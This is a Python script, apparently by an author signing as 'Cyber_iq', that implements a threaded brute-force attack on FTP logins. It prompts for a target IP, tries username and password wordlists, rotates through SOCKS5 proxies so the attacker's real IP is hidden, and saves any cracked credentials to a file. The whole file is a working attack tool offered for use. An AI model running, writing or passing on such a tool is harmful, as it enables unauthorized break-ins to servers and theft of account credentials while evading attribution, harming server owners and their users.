import ftplib
import sys
import threading
import time
import os
import subprocess
import socks  # يحتاج تثبيت pip install PySocks
import socket

# شعار البرنامج - تم إضافة r لتجنب SyntaxWarning
Banner5 = r"""
          _nnnn_
         dGGGGMMb
        @p~qp~~qMb
        M|@||@) M|
        @,----.JM|
       JS^\__/  qKL
      dZP        qKRb
     dZP          qKKb
    fZP            SMMb
    HZM            MMMM
    FqM            MMMM
  __| ".         |\dS"qML
  |    `.       | `' \Zq
 _)      \.___.,|      .'
\____    )MMMMMP|    .'
      `-'        `--' Coder by Cyber_iq"""

def run_proxy_tool():
    """تشغيل أداة البروكسي أولاً"""
    print("[*] Accessing proxy directory and running prxy.py...")
    try:
        # تشغيل الأداة وانتظارها حتى تنتهي
        subprocess.run(['python3', 'proxy/prxy.py'], check=True)
        print("[+] Proxy tool finished working.")
    except Exception as e:
        print(f"[-] Error running proxy tool: {e}")

def get_live_proxies():
    """جلب البروكسيات الشغالة من الملف"""
    path = "proxy/live.txt"
    if os.path.exists(path):
        with open(path, 'r') as f:
            proxies = f.read().splitlines()
            # تنظيف القائمة من الأسطر الفارغة
            return [p for p in proxies if p.strip()]
    return []

os.system('clear' if os.name == 'posix' else 'cls')
print(Banner5)
print("instagram ---> @Cyber_iq\n")

# 1. تشغيل أداة البروكسي
run_proxy_tool()

# 2. جلب النتائج
live_proxies = get_live_proxies()

# 3. ميزة الإيقاف التلقائي: إذا لم تنجح أداة البروكسي في إيجاد أي بروكسي يعمل
if not live_proxies:
    print("\n\033[91m[!] Critical Error: No working proxies found in live.txt!")
    print("[!] The tool will shut down now to prevent leaking your real IP.\033[0m")
    sys.exit()

print(f"[+] Loaded {len(live_proxies)} live proxies. Starting FTP attack...")

# إدخال البيانات
host = input(" -> Enter Target IP: ")
user_file = "user.txt"
pass_file = "pass.txt"

try:
    users = open(user_file, 'r').read().splitlines()
    passwords = open(pass_file, 'r').read().splitlines()
except FileNotFoundError:
    print("Error: Files not found!")
    sys.exit()

total_users = len(users)
total_passes = len(passwords)
tested_users = 0
found = False
lock = threading.Lock()

def brute_force(username, password, proxy_str):
    global found, tested_users
    if found: return
    
    try:
        # إعداد البروكسي للاتصال
        proxy_ip, proxy_port = proxy_str.split(':')
        
        # ضبط البروكسي للعملية
        socks.set_default_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
        socket.socket = socks.socksocket
        
        ftp = ftplib.FTP(timeout=5)
        ftp.connect(host, 21)
        ftp.login(username, password)
        
        with lock:
            if not found:
                print(f"\n\n{'='*40}")
                print(f" SUCCESS! User: {username} | Pass: {password} | Via: {proxy_str}")
                print(f"{'='*40}\n")
                found = True
                with open("results.txt", "a") as f:
                    f.write(f"IP: {host} | User: {username} | Pass: {password}\n")
        ftp.quit()
    except:
        pass

# التنفيذ الرئيسي
proxy_index = 0
for user_index, user in enumerate(users):
    if found: break
    tested_users = user_index + 1
    
    for i in range(0, total_passes, 10):
        if found: break
        batch = passwords[i:i+10]
        threads = []
        
        # تحديث الواجهة
        current_proxy = live_proxies[proxy_index % len(live_proxies)]
        sys.stdout.write(f"\r[+] Testing: {user} | Proxy: {current_proxy} | Users: {tested_users}/{total_users}   ")
        sys.stdout.flush()

        for password in batch:
            current_p = live_proxies[proxy_index % len(live_proxies)]
            t = threading.Thread(target=brute_force, args=(user, password, current_p))
            t.start()
            threads.append(t)
            proxy_index += 1 
        
        for t in threads:
            t.join()

if not found:
    print("\n\n[!] Finished: No valid credentials found.")
